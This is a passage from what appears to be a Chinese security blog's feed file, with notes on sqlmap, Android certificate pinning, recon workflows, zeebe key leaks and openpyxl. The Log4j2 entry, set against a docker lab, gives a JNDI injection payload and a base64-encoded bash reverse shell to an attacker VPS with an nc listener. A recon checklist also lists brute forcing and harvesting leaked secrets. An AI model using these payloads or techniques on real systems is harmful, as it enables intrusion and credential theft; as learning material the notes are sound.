-SHn 65535 增加完以后，执行. /etc/profile 生效（注意.后面有空格）</span><br><span class="line">4、在/etc/security/limits.conf最后增加如下两行记录</span><br><span class="line">* soft nofile 65535</span><br><span class="line">* hard nofile 65535</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.Web攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记sqlmap -r参数测试https请求包时遇到的坑</title>
      <link href="/2022/04/25/%E8%AE%B0sqlmap-r%E5%8F%82%E6%95%B0%E6%B5%8B%E8%AF%95https%E8%AF%B7%E6%B1%82%E5%8C%85%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2022/04/25/%E8%AE%B0sqlmap-r%E5%8F%82%E6%95%B0%E6%B5%8B%E8%AF%95https%E8%AF%B7%E6%B1%82%E5%8C%85%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>测试https请求包的时候，使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r post1.txt</span><br></pre></td></tr></table></figure><p>结果却始终提示timeout，查了一段时间才知道，由于Burp请求包中host是不带端口，一般区分是端口或者协议，都是使用上面的设置，如下：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220425191652190.png" alt="image-20220425191652190"></p><p>所以光一个数据包交给sqlmap,sqlmap是不知道这个包是什么协议，以及是走什么端口的，所以就需要手工添加端口，而且如果是https，还要给sqlmap命令中加一个–force-ssl才行，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r post1.txt --force-ssl</span><br></pre></td></tr></table></figure><p>其他端口的情况下可以这样：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220425192154962.png" alt="image-20220425192154962"></p>]]></content>
      
      
      <categories>
          
          <category> 1.杂七杂八 </category>
          
          <category> 1.那些年爬过的坑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>log4j2复现</title>
      <link href="/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>参考资料：<a href="https://blog.csdn.net/weixin_43795682/article/details/123557217">https://blog.csdn.net/weixin_43795682/article/details/123557217</a></p><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>docker pull vulfocus&#x2F;log4j2-rce-2021-12-09:latest&#x2F;&#x2F;docker拉漏洞环境</p><p>docker run -p  8080:8080 -d –name log4j2-rce  vulfocus&#x2F;log4j2-rce-2021-12-09&#x2F;&#x2F;运行环境，映射到主机8080端口</p><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;jndi:ldap://wdhcrj.dnslog.cn/exp&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载<a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%83release%E4%B8%AD%E7%9A%84%E7%8E%B0%E6%88%90jar%EF%BC%8C%E5%BD%93%E7%84%B6%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E4%B9%9F%E5%8F%AF%E4%BB%A5%E3%80%82">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md工具，下载它release中的现成jar，当然自己编译也可以。</a></p><p>把JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar拖到VPS，使用以下命令，构建JNDI环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><p>其中YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE&#x3D;是base64加密后的反弹shell命令，解密为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/432 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><p>以上命令的功能是反弹一个shell到VPS的432端口。</p><p>由于JNDI环境需要用到8180、1099、1389这3个端口，所以要确保VPS上这3个端口未被占用，并且在云防火墙上开放这3个端口限制。</p><p>JNDI命令执行后，效果如下：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424195833352.png" alt="image-20220424195833352"></p><p>最后，VPS上监听432端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 432</span><br></pre></td></tr></table></figure><p>使用上图中只有一行的链接，代入如下payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:rmi://xxx.xxx.xxx.xxx:1099/jdulim&#125;</span><br></pre></td></tr></table></figure><p>有时注入点在get参数上，就需要把整个payloadURL编码，如下：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424200438345.png" alt="image-20220424200438345"></p><h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><p>使用burp插件</p><p><a href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a></p><p>下载jar包后，导入到burpsuite扩展中，配置任意dnslog平台的api和token即可，其他保持默认</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207221004703.png" alt="image-20220722100448161"></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 3.已知漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shuize代码阅读</title>
      <link href="/2022/04/15/Shuize%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/"/>
      <url>/2022/04/15/Shuize%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">domain//域名</span><br><span class="line">allTargets_list=[]//xx列表</span><br><span class="line">allTargets_Queue= Queue(-1)//队列，先进先出，无上限</span><br><span class="line">CIP_List=[]//C段IP列表</span><br><span class="line">ip_count = Counter()//C段出现的IP个数</span><br><span class="line">newDomains = []//和目标资产关联的新根域名</span><br><span class="line">socksproxysDict = &#123;&quot;baidu&quot;:[], &quot;google&quot;:[]&#125;</span><br></pre></td></tr></table></figure><p>逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init()###########################//函数</span><br><span class="line">--定义变量test//定义变量</span><br><span class="line">[这块代码的功能是什么]//略写代码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">init()#########################################</span><br><span class="line">--定义全局变量domain, cSubnet, save_fold_path, excel, excel_name, excelSavePath, proxy, \</span><br><span class="line">        requests_proxies, isIntranet, xlsxFileWB, weak, CIP_List, allTargets_List, \</span><br><span class="line">        allTargets_Queue, masNmapFile, newDomains, ip_count, fofaTitle, ksubdomain, justInfoGather, socksProxysDict</span><br><span class="line">打印banner()</span><br><span class="line">检查版本并打印版本信息checkVersion()</span><br><span class="line">定义命令行参数列表parse = OptionsParser(usage=usage)</span><br><span class="line">--定义变量allTargets_list,allTargets_Queue,CIP_List,ip_count,newDomains,socksproxysDict</span><br><span class="line">打印变量domain,cSubnet,isIntranet,proxy,File</span><br><span class="line">if proxy存在：</span><br><span class="line">--定义变量requests_proxies=http和https代理</span><br><span class="line">else:</span><br><span class="line">--定义变量requests_proxies为空</span><br><span class="line">[如果cSubnet存在，从其中取出ip，存入队列allTargets_Queue和列表allTargets_list]</span><br><span class="line">[如果File存在，且在外网，则从File文件里取ip，存入队列allTargets_Queue和列表allTargets_list]</span><br><span class="line">[扫描内网漏洞(Web或服务)]</span><br><span class="line">if File存在 and 在局域网中:</span><br><span class="line">[内网漏洞扫描]</span><br><span class="line">else:</span><br><span class="line">try:</span><br><span class="line">--定义变量save_fold_path=当前目录下+/result/+uuid4()所产生随机数列的最后一列，以-为分割算</span><br><span class="line">建立save_fold_path所代表目录</span><br><span class="line">except Exception:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">--定义变量excel=返回一个excel对象</span><br><span class="line">删除excel的第一个默认表</span><br><span class="line"></span><br><span class="line">if domain存在 and cSubnet也存在:</span><br><span class="line">提示两者只能跑一个</span><br><span class="line">退出程序exit(0)</span><br><span class="line">elif domain存在 and cSubnet不存在:</span><br><span class="line">打印跑某某域名提示</span><br><span class="line">--定义表名为domain</span><br><span class="line">--定义表保存路径为excelSavePath</span><br><span class="line">跑子域名run_subdomain()</span><br><span class="line">elif domain不存在 and cSubnet存在:</span><br><span class="line">[跑C段]</span><br><span class="line">elif File存在：</span><br><span class="line">[扫漏洞]</span><br><span class="line">elif masNmapFile:</span><br><span class="line">[跑masscan和nmap]</span><br><span class="line">elif fofaTitle:</span><br><span class="line">[跑fofa]</span><br><span class="line">elif domainFile:</span><br><span class="line">[批量域名信息收集]</span><br><span class="line">elif testDemo==1:</span><br><span class="line">--定义domian=&#x27;&#x27;</span><br><span class="line">--定义保存路径save_fold_path=当前路径+/result/+唯一标识id</span><br><span class="line">根据save_fold_path创建目录</span><br><span class="line">--定义表名excel_name=domain</span><br><span class="line">--定义excelSavePath为表格实际保存路径</span><br><span class="line">[用来测试各模块的代码]</span><br><span class="line">elif getSocks=1:</span><br><span class="line">[从fofa搜集代理]</span><br><span class="line"></span><br><span class="line">run_subdomain()#########################################</span><br><span class="line">--定义companyName=跑备案新域名beianNewDomain()</span><br><span class="line">跑爱企查Aiqicha(companyName)</span><br><span class="line">--定义Subdomains_ips=&#123;&#125;</span><br><span class="line">--定义isPanAnalysis=判断是否泛解析checkPanAnalysis()</span><br><span class="line">if 不是泛解析 and ksudomain存在:</span><br><span class="line">--定义ksudomains=调用ksudomain脚本跑子域名callKsubdomain()</span><br><span class="line">else</span><br><span class="line">ksudomains=[]</span><br><span class="line">打印ksudomain跑的子域名结果</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printGetNewSubdomains()#########################################</span><br><span class="line">if 域名的长度&gt;0:</span><br><span class="line">--定义newSubdomains=</span><br></pre></td></tr></table></figure><p>没学过的模块及其函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">allTargets_Queue = Queue(-1)//新建一个队列，先进先出，空间无上限</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Queue():</span><br><span class="line">模块结构:Queue--&gt;Queue(maxsize)</span><br><span class="line">返回一个队列对象，先进先出；如果maxsize小于等于0，则队列大小无限制</span><br><span class="line"></span><br><span class="line">queue.qsize() 返回队列的大小</span><br><span class="line">queue.empty() 如果队列为空，返回True,反之False</span><br><span class="line">queue.full() 如果队列满了，返回True,反之False</span><br><span class="line">queue.full 与 maxsize 大小对应</span><br><span class="line">queue.get([block[, timeout]])获取队列，timeout等待时间</span><br><span class="line">queue.get_nowait() 相当queue.get(False)</span><br><span class="line">queue.put(item) 写入队列，timeout等待时间</span><br><span class="line">queue.put_nowait(item) 相当queue.put(item, False)</span><br><span class="line">queue.task_done() 在完成一项工作之后，queue.task_done()函数向任务已经完成的队列发送一个信号</span><br><span class="line">queue.join() 实际上意味着等到队列为空，再执行别的操作</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for ip in IP(&#x27;&#123;&#125;/24&#x27;.format(CIP))://遍历CIP变量所代表C端的所有ip地址</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">IP():</span><br><span class="line">模块结构：IPy--&gt;IP()</span><br><span class="line">返回IP网段对象以供处理</span><br><span class="line"></span><br><span class="line">ip=IP(&quot;192.168.0.0/16&quot;)//定义ip网段</span><br><span class="line">ip.len()//返回网段的ip个数</span><br><span class="line">for x in ip:</span><br><span class="line">print(x)//遍历输出ip</span><br><span class="line">ip.reverseName()//反向解析地址格式</span><br><span class="line">ip.iptype()//判断私有地址还是公有地址</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">save_fold_path = os.getcwd() + &#x27;/result/&#x27; + str(uuid4()).split(&#x27;-&#x27;)[-1]//定义变量存储保存路径save_fold_path=当前目录+/result/+唯一标识uuid随机数的最后一段</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">uuid4():</span><br><span class="line">模块结构：uuid--&gt;uuid4()</span><br><span class="line">返回一个通过MAC地址, 时间戳, 命名空间, 随机数, 伪随机数来生成的唯一id标识</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newSubdomains = list(set(new_subdomains) - set(old_subdomains))//将一个列表set()为一个元素不重复的集合，再用new_subdomains生成的集合(刚跑完的脚本收集的子域名)-old_subdomains生成的集合(前面已经收集好的子域名)，将会对比出new_subdomains中不存在于old_subdomains中的元素的集合，最后list()依靠这个集合生成一个列表，返回给newSubdomains覆盖保存</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.自动化 </category>
          
          <category> 1.信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓手机抓包</title>
      <link href="/2022/04/15/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85/"/>
      <url>/2022/04/15/%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h3 id="安卓7以上"><a href="#安卓7以上" class="headerlink" title="安卓7以上"></a>安卓7以上</h3><h4 id="导入证书到系统信任"><a href="#导入证书到系统信任" class="headerlink" title="导入证书到系统信任"></a>导入证书到系统信任</h4><h5 id="1，计算原证书hash值"><a href="#1，计算原证书hash值" class="headerlink" title="1，计算原证书hash值"></a>1，计算原证书hash值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># .cer格式证书</span><br><span class="line">openssl x509 -inform DER -subject_hash_old -in &lt;证书文件.cer&gt;</span><br><span class="line"># .pem格式证书</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -in  &lt;证书文件.pem&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220415112427631.png" alt="image-20220415112427631"></p><h5 id="2，重编译原证书，生成新证书"><a href="#2，重编译原证书，生成新证书" class="headerlink" title="2，重编译原证书，生成新证书"></a>2，重编译原证书，生成新证书</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cer格式</span><br><span class="line">openssl x509 -inform DER -text -in xxx.cer &gt; 269953fb.0</span><br><span class="line"># pem格式</span><br><span class="line">openssl x509 -inform PEM -text -in xxx.pem &gt; 269953fb.0</span><br></pre></td></tr></table></figure><h5 id="3-把新证书文mo的代码移动到顶部"><a href="#3-把新证书文mo的代码移动到顶部" class="headerlink" title="3,把新证书文mo的代码移动到顶部"></a>3,把新证书文mo的代码移动到顶部</h5><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220415113052466.png" alt="image-20220415113052466"></p><h5 id="4，上传新证书至root手机或模拟器"><a href="#4，上传新证书至root手机或模拟器" class="headerlink" title="4，上传新证书至root手机或模拟器"></a>4，上传新证书至root手机或模拟器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">adb push C:\Users\23983\Desktop\269953fb.0 /sdcard/269953fb.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/system 目录只读，我们需要赋予读写权限，然后重新挂载</span></span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mount -o remount,rw /system</span></span><br><span class="line">su</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把新证书放到 /system/etc/security/cacerts/ 目录下</span></span><br><span class="line">cp /sdcard/269953fb.0 /system/etc/security/cacerts/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给新证书 重新授权</span></span><br><span class="line">chmod 644 /system/etc/security/cacerts/269953fb.0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>参考资料：<a href="https://www.cnblogs.com/mua9102/p/15034164.html">https://www.cnblogs.com/mua9102/p/15034164.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 1.外围渗透 </category>
          
          <category> 1.移动安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集思路</title>
      <link href="/2022/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>【组织架构】</p><p>【主域名】</p><p>–备案反查顶级域名（<a href="http://icp.chinaz.com)/">http://icp.chinaz.com）</a></p><p>–ip反查域名</p><p>–组织架构，子公司信息收集</p><p>【子域名】</p><p>–子域名爆破（非泛解析域名；收集subfinder、Sbulist3r、OneForAll、子域名挖掘机、ksubdomain的字典）</p><p>–子域名查询（theHarvester、virustotal、ce.baidu.com、url.fht.im……水泽……，集成水泽的所有功能，并写一个接口测试模块，信息收集开始前，显示有效接口列表；信息收集结束后，如果有未正常结束的，产生告警。并对所有接口模块化编程，使用户在知道哪个接口异常后，可以轻松找到对应接口的脚本文件，纠错，并使用该单一脚本文件补全结果。）</p><p>–IP反查域名</p><p>–友链爬虫</p><p>‘’‘算法：后爬到的域名越靠前，证明它越难被收集到，越有可能测到漏洞’‘’</p><p>‘’‘算法：多列表切割结果，实时存放结果，如一个列表存放10000个子域名，10000满后就将列表中的值全部保存到文件1中，依次类推，直到结束后，从编号最大的一个文件开始倒序读取子域名，存入同一文件当中，这样最后收集到的子域名就变成了最终子域名列表的第一个’‘’</p><p>【IP:端口】</p><p>–子域名解析</p><p>–nmap</p><ul><li>收集IP列表及其端口开放情况，批量对某些可以公开登录的服务进行弱密码爆破</li></ul><p>【github信息收集】</p><p>–水泽</p><ul><li>zeebe密钥泄露</li><li>各类服务、主机用户名密码泄露</li><li>源代码泄露</li><li>Sql代码泄露</li></ul><p>【存活URL验证】</p><p>–http&#x2F;https双验证</p><p>–vpn二次验证（双验证不存活，则挂三个不同vpn二次验证，还不存活则认定不存活）</p><p>【存活URL版本特征检索】</p><p>–目录爬虫（根据某些cms的特殊目录名，如swagger-ui、zentao、seeyon等来确定）</p><p>–响应头检索（根据Server、x-forwared-for等响应头泄露的信息来判断）</p><p>–报错信息判断（根据nginx、apache、thinkphp等的特征报错信息来判断；可以使用奇怪文件名、目录回溯、错误参数等方法来引发报错）</p><p>【微信】</p><p>【APP】</p><p>【小程序】</p><p>【网盘】</p><p>【邮箱】</p><p>【社工库】</p><p>【特殊后台检索】</p><p>–管理员后台</p><p>–用户后台</p><p>–邮箱地址</p><p>–vpn地址</p><p>–安全设备管理后台</p><p>–网络设备管理后台</p><p>–及其他</p>]]></content>
      
      
      <categories>
          
          <category> 1.信息收集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>zeebe密钥信息泄露</title>
      <link href="/2022/04/12/zeebe%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
      <url>/2022/04/12/zeebe%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<p>zeebe会生成一个密钥，密钥可以导出成一个名为CamundaCloudMgmtAPI-Client-test.txt文本文档。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export ZEEBE_ADDRESS=&#x27;bbbbbbbb-947b-bbbb-b7b7-bbbbbbbb2e77.bru-2.zeebe.camunda.io:443&#x27;</span><br><span class="line">export ZEEBE_CLIENT_ID=&#x27;bbbbbbDTbbbbbbbbbb-.wfbbbbbbbbbb&#x27;</span><br><span class="line">export ZEEBE_CLIENT_SECRET=&#x27;ZxRh9BE4EPY521Pbbbbbbbbbbbbbbbbbbbbbbbbbb~w4if2u~OAbbbbbbbbbb~AR&#x27;</span><br><span class="line">export ZEEBE_AUTHORIZATION_SERVER_URL=&#x27;https://login.cloud.camunda.io/oauth/token&#x27;</span><br></pre></td></tr></table></figure><p>通过zbctl命令可以使用该密钥控制zeebe，具体流程为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i -g zbctl//安装npm环境</span><br><span class="line">source CamundaCloudMgmtAPI-Client-test.txt//导入密钥</span><br><span class="line">zbctl status//查看zeebe状态</span><br></pre></td></tr></table></figure><p>如果成功，则会返回类似如下信息</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220412212935249.png" alt="image-20220412212935249"></p><p>可以利用密钥明显的关键字，使用GSIL监控github，抓取zeebe密钥泄露情况，提交到对应src.</p><p>参考资料（zeebe文档）：<a href="https://docs.camunda.io/docs/guides/getting-started/connect-to-your-cluster/">https://docs.camunda.io/docs/guides/getting-started/connect-to-your-cluster/</a></p>]]></content>
      
      
      <categories>
          
          <category> 1.信息收集 </category>
          
          <category> 1.github信息泄露 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>openpyxl模块-excel自动化处理</title>
      <link href="/2022/04/07/openpyxl%E6%A8%A1%E5%9D%97-excel%E8%87%AA%E5%8A%A8%E5%8C%96%E5%A4%84%E7%90%86/"/>
      <url>/2022/04/07/openpyxl%E6%A8%A1%E5%9D%97-excel%E8%87%AA%E5%8A%A8%E5%8C%96%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>参考资料：<a href="https://www.osgeo.cn/openpyxl/index.html">https://www.osgeo.cn/openpyxl/index.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install openpyxl//安装</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import openpyxl//导入</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wb=openpyxl.load_workbook(&#x27;test.xlsx&#x27;)//导入xlsx文件</span><br><span class="line">sheet1=wb[&#x27;表名&#x27;]//指定表</span><br><span class="line">sheet1=wb.active//指定表为当前活动表格</span><br><span class="line">sheet1.max_row//表格最大行数</span><br><span class="line">sheet1.cell(row=row_num,column=column_num).value//取单元格值，行和列都从1开始</span><br><span class="line">wb.save(&#x27;test.xlsx&#x27;)//保存</span><br><span class="line">wb.close()//关闭文件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 1.自动化 </category>
          
          <category> 1.文件处理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用总结</title>
      <link href="/2022/02/18/sqlmap%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2022/02/18/sqlmap%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
